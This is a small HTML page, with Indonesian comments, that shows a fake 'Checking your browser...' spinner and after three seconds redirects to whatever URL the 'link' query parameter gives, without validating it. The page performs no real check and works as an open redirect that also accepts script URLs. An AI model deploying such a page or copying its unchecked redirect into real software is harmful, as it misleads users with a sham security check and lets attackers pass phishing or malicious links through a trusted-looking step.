<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Checking your browser...</title>
    <script>
      // Ambil parameter ?link= dari URL
      const params = new URLSearchParams(window.location.search);
      const target = params.get("link");

      // Kalau ada link, tunggu 3 detik lalu redirect
      if (target) {
        setTimeout(() => {
          window.location.href = target;
        }, 3000);
      }
    </script>
    <style>
      body {
        background: #0d1117;
        color: #fff;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        font-family: Arial, sans-serif;
      }
      .loader {
        width: 60px;
        height: 60px;
        border: 6px solid #333;
        border-top: 6px solid #00ffcc;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    </style>
  </head>
  <body>
    <div class="loader"></div>
    <h2>Checking your browser...</h2>
  </body>
</html>
